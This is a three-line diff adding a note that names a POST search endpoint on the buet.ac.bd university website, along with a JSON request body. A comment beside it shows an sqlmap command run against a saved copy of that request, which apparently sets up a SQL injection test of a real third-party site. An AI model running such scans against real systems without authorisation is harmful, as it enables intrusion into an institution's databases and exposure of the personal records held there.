@@ -1,0 +1,3 @@
+http://www.buet.ac.bd:80/service/api/CentralSearchQuery/LoadFromDiaryPeople (POST)  # .\sqlmap.py -r .\postReqs\buetfinal
+
+{"KeyWord":"buet","SortByEntryDate":true,"IsAscending":true,"PageObj":null}
